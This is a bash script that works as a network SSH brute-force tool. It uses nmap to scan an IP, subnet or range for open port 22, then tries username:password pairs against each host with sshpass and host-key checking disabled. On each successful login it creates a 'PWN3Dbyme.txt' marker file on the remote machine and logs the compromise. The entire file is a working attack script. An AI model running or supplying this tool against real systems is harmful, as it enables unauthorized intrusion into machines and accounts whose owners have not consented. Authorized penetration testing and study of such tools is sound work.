#!/bin/bash
targets_array=()
credentials_array=()
action_logs=()

action_logger() {
    local message="$1"
    action_logs+=("$message")
    printf "%s\n" "$message"
}

check_sshpass() {
    if ! command -v sshpass >/dev/null 2>&1; then
        printf "Error: sshpass is not installed.\n"
        printf "Please install it with \"sudo apt install sshpass\" to use this tool.\n"
        return 1
    fi
    return 0
}

brute_ssh() {
    local target="$1"
    local credential="$2"
    local remote_cmd
    local username
    local password

    IFS=':' read -r username password <<< "$credential"

    [[ -z $target || -z $username || -z $password ]] && return 1

    printf 'user=%s\n' "$username"
    printf 'pass=%s\n' "$password"

    printf "Trying $username@$target with password: $password\n"
    echo

    remote_cmd='current_dir=$(pwd); touch "$current_dir/PWN3Dbyme.txt" && test -f "$current_dir/PWN3Dbyme.txt" && echo "$current_dir/PWN3Dbyme.txt"'
    ssh_exec=$(sshpass -p "$password" ssh \
        -p 22 \
        -o StrictHostKeyChecking=no \
        -o UserKnownHostsFile=/dev/null \
        -o ConnectTimeout=5 \
        -o PreferredAuthentications=password \
        -o PubkeyAuthentication=no \
        -o NumberOfPasswordPrompts=1 \
        "$username@$target" "$remote_cmd" 2>/dev/null)
    
    if [[ $? -eq 0 ]]; 
    then
        action_logger "SUCCESS! $username@$target created $ssh_exec"
        printf "Created file at: %s\n" "$ssh_exec"
        echo
        return 0
    else
        action_logger "FAILED! Login failed for $username@$target"
        echo
        return 1
    fi
}

file_or_cred_check() {
    local user_input="$1"
    local line

    if [[ -f "$user_input" && -r "$user_input" ]]; then
    while IFS= read -r line; do
        [[ -z $line ]] && continue
        [[ $line =~ ^# ]] && continue
        if [[ $line =~ ^[^:]+:[^:]+$ ]]; then
            credentials_array+=("$line")
        else
            printf "Skipping invalid credential line: %s\n" "$line"
        fi
    done < "$user_input"

    [[ ${#credentials_array[@]} -gt 0 ]] || return 1

    return 0

    fi

    if [[ $user_input =~ ^[^:]+:[^:]+$ ]]; then
        credentials_array+=("$user_input")
        return 0
    fi

    return 1
}

nmap_scan() {
    local result=$(nmap -p 22 --open -oG - -n "$1" | grep '22/open/' | awk '{print $2}')
    if [[ -z $result ]]; then
        return 1
    fi
    
    for i in $result; do
        targets "$i"
    done 

    return 0
}

targets() {
    targets_array+=("$1")
}

is_it_valid_ip() {
    local ip="$1"
    local octets

    if [[ ${ip} =~ ^[0-9]{1,3}(\.[0-9]{1,3}){3}$ ]]; then
          IFS=. read -ra octets <<< "$ip"
          for i in "${octets[@]}"
          do
            if [[ $i -gt 255 ]]; then
                return 1;
            fi
          done
        return 0;
    else
        return 1;
    fi
}

is_it_valid_CIDR() {
    local CIDR="$1"
    local cidr_parts 
    local ip 
    local prefix

    IFS='/' read -ra cidr_parts <<< "$CIDR"

    if [[ ${#cidr_parts[@]} -ne 2 ]]; then
        return 1
    fi
    
    ip="${cidr_parts[0]}"
    prefix="${cidr_parts[1]}"

    if [[ -z $ip || -z $prefix ]]; then
        return 1
    fi

    if ! is_it_valid_ip "$ip"; then
        return 1
    fi

    if [[ ! $prefix =~ ^[0-9]+$ ]]; then
        return 1
    fi

    if [[ $prefix -lt 0 || $prefix -gt 32 ]]; then
        printf "INVALID CIDR ERROR\n"
        printf "the range for the subnet is between 0 and 32, you have entered: $prefix\n" 
        return 1
    fi

    return 0;
}

is_it_valid_range() {
    local range="$1"
    local range_parts 
    local range_start 
    local range_end

    IFS='-' read -ra range_parts <<< "$range"

    if [[ ${#range_parts[@]} -ne 2 ]]; then
        printf "are you sure the format is right?\n"
        printf "could not split format into two parts\n"
        return 1
    fi

    range_start="${range_parts[0]}"
    range_end="${range_parts[1]}"

    if [[ -z $range_start || -z $range_end ]]; then
        printf "missing part of the IP format\n"
        printf "range start: $range_start\n" 
        printf "range end: $range_end\n" 
        return 1
    fi

    if ! is_it_valid_ip "$range_start"; then
        printf "this is not a valid IP: $range_start\n" 
        return 1
    fi

    if [[ ! $range_end =~ ^[0-9]+$ ]]; then
        return 1
    fi

    if [[ $range_end -lt 0 || $range_end -gt 255 ]]; then
        printf "the range should be between 0 and 255.\n"
        printf "you've entered: $range_end\n" 
        return 1
    fi

    IFS='.' read -ra start_octets <<< "$range_start"
    local first_host="${start_octets[3]}"
    
    if [[ $range_end -lt $first_host ]]; then
        printf "last IP cant be smaller than first IP.\n"
        printf "first IP: $first_host\n"
        printf "last IP: $range_end\n"
        return 1
    fi

    return 0
}

read -r -p "Please Enter target IP or subnet (Ex: 192.168.1.1 or 192.168.1.0/24 or 192.168.1.1-10):" target_range

if is_it_valid_CIDR "$target_range"; then
    printf "Valid CIDR subnet!\n"
    sleep 1
    printf "Scanning for open ssh ports...\n"
    sleep 1
    if ! nmap_scan "$target_range"; then
        printf "No open ports were found...\n"
        exit 1
    else
        printf "Open Ports were found on these IP addresses\n"
        printf -- "--------------------------------------\n"
        printf '%s\n' "${targets_array[@]}"
        echo
        read -r -p "Please Provide a single Credential for ssh, or a file as user:pass :" credentials
        if ! file_or_cred_check "$credentials"; then
            printf "Invalid credential input\n"
            exit 1
        fi

        if ! check_sshpass; then
            exit 1
        fi

        for target in "${targets_array[@]}"; do
            for credential in "${credentials_array[@]}"; do
                brute_ssh "$target" "$credential"
            done
        done
    fi

elif is_it_valid_ip "$target_range"; then
    printf "Valid IP address!\n"
    sleep 1
    printf "Scanning for open ssh ports...\n"
    sleep 1
    if ! nmap_scan "$target_range"; then
        printf "No open ports were found...\n"
        exit 1
    else
        printf "Open Ports were found on these IP addresses\n"
        printf -- "--------------------------------------\n"
        printf '%s\n' "${targets_array[@]}"
        read -r -p "Please Provide a single Credential for ssh, or a file as user:pass :" credentials
        if ! file_or_cred_check "$credentials"; then
            printf "Invalid credential input\n"
            exit 1
        fi

        if ! check_sshpass; then
            exit 1
        fi

        for target in "${targets_array[@]}"; do
            for credential in "${credentials_array[@]}"; do
                brute_ssh "$target" "$credential"
            done
        done
    fi 
elif is_it_valid_range "$target_range"; then
    printf "great success!\n"
    sleep 1
    printf "Scanning for open ssh ports...\n"
    sleep 1
    if ! nmap_scan "$target_range"; then
        printf "No open ports were found...\n"
        exit 1
    else
        printf "Open Ports were found on these IP addresses\n"
        printf -- "--------------------------------------\n"
        printf '%s\n' "${targets_array[@]}"
        read -r -p "Please Provide a single Credential for ssh, or a file as user:pass :" credentials
        if ! file_or_cred_check "$credentials"; then
            printf "Invalid credential input\n"
            exit 1
        fi

        if ! check_sshpass; then
            exit 1
        fi

        for target in "${targets_array[@]}"; do
            for credential in "${credentials_array[@]}"; do
                brute_ssh "$target" "$credential"
            done
        done
    fi
else
    printf "Invalid input\n"
fi

read -r -p "Would you like to save the action log to a file? (y/N): " save_this

case "$save_this" in
    y|Y|yes|Yes|YES)
        read -r -p "enter output filename: " output_name
        printf "%s\n" "${action_logs[@]}" > $output_name
        printf "Action log saved to %s\n" "$output_name"
        ;;
    *)
        printf "Log was not saved. \n"
        ;;
esac